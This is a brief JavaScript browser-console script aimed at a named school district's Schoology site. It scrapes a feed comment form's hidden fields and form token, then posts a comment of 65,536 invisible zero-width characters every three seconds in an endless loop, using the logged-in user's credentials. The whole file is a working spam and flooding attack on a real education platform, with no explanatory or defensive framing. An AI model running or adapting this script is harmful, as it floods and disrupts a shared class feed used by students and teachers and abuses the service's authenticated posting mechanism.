/*
* @Author: UnsignedByte
* @Date:   22:13:18, 12-Aug-2020
* @Last Modified by:   UnsignedByte
* @Last Modified time: 23:41:00, 12-Aug-2020
*/

// ex: edge-assoc-<stuff>
let id = null;
let content = "\u200D".repeat(65536)
let dat = Object.assign(...Array.prototype.slice.call(document.querySelectorAll(`#${id} .feed-comments .s-comments-post-form > form > div > input`)).map(x=>({[x.name]: x.value})))

const delay = ms => new Promise(res => setTimeout(res, ms));

for(;;){
	await fetch(`https://pausd.schoology.com/${dat.node_realm}/${dat.node_realm_id}/feed?page=0`, {
	  "headers": {
	    "accept": "application/json, text/javascript, */*; q=0.01",
	    "accept-language": "en-US,en;q=0.9",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin",
	    "x-requested-with": "XMLHttpRequest"
	  },
	  "referrer": `https://pausd.schoology.com/${dat.node_realm}/${dat.node_realm_id}/updates`,
	  "referrerPolicy": "no-referrer-when-downgrade",
	  "body": `nid=${dat.nid}&nid2=${dat.nid2}&node_realm=${dat.node_realm}&node_realm2=${dat.node_realm2}&node_realm_id=${dat.node_realm_id}&node_realm_id2=${dat.node_realm_id2}&pid=&comment=${content}&form_token=${dat.form_token}&form_id=${dat.form_id}&op=Post&drupal_ajax=1`,
	  "method": "POST",
	  "mode": "cors",
	  "credentials": "include"
	});
	await delay(3000);
}